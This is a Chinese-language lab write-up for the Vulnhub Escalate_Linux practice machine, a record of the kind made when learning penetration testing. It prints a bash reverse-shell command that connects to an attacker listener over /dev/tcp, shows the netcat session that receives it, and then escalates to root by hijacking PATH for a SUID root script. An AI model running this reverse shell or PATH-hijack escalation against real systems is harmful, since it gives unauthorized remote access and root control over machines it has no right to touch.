[(162条消息) 【靶机渗透】Escalate_Linux靶机渗透练习+12种提权方式_-escalate_linux_malloc_冲！的博客-CSDN博客](https://blog.csdn.net/serendipity1130/article/details/120009530)

[Vulnhub-靶机-ESCALATE_LINUX: 1 - 皇帽讲绿帽带法技巧 - 博客园 (cnblogs.com)](https://www.cnblogs.com/autopwn/p/13804500.html)

# 得到权限

<img src=".\图片\Snipaste_2023-07-01_10-13-08.png" alt="Snipaste_2023-07-01_10-13-08" style="zoom:80%;" />

```bash
bash -c '/bin/bash -i >& /dev/tcp/192.168.0.103/1234 0>&1'
export TERM=xterm
python -c 'import pty; pty.spawn("/bin/bash")'
```



```bash
└─# nc -lvvp 1234
listening on [any] 1234 ...
connect to [192.168.0.103] from 192.168.0.102 [192.168.0.102] 51504
bash: cannot set terminal process group (1034): Inappropriate ioctl for device
bash: no job control in this shell
Welcome to Linux Lite 4.4 
 
Friday 30 June 2023, 22:16:28
Memory Usage: 337/985MB (34.21%)
Disk Usage: 5/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
 user6  / | var | www | html  id
id
uid=1005(user6) gid=1005(user6) groups=1005(user6) 
 user6  / | var | www | html  export TERM=xterm                                
export TERM=xterm
 user6  / | var | www | html  python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
Welcome to Linux Lite 4.4 
 
Friday 30 June 2023, 22:17:41
Memory Usage: 343/985MB (34.82%)
Disk Usage: 5/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)

```



# 权限提升

## 环境变量劫持

1、查找 suid 权限的文件

```bash
find / -perm -u=s -type f 2>/dev/null

find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/sbin/mount.ecryptfs_private
/sbin/mount.cifs
/usr/sbin/pppd
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/umount
/bin/fusermount
/home/user5/script
/home/user3/shell
```

2、查看 `/home/user5/script`

```bash
-rwsr-xr-x  1 root  root  8392 Jun  4  2019 script
```

3、运行看看，它执行的是 ls 命令

```bash
user6  / | home | user5  ./script
./script
Desktop    Downloads  Pictures	Templates  ls
Documents  Music      Public	Videos	   script

```

4、环境变量劫持

```bash
cd /tmp
echo "/bin/bash" > ls
chmod +x ls
echo $PATH
export PATH=/tmp:$PATH
cd /home/user5/
./script
```

```bash
 root  / | home | user5  id
id
uid=0(root) gid=0(root) groups=0(root),1005(user6)

```

还有很多方法提权，这里不展示了

# 总结

提权靶场，环境变量劫持
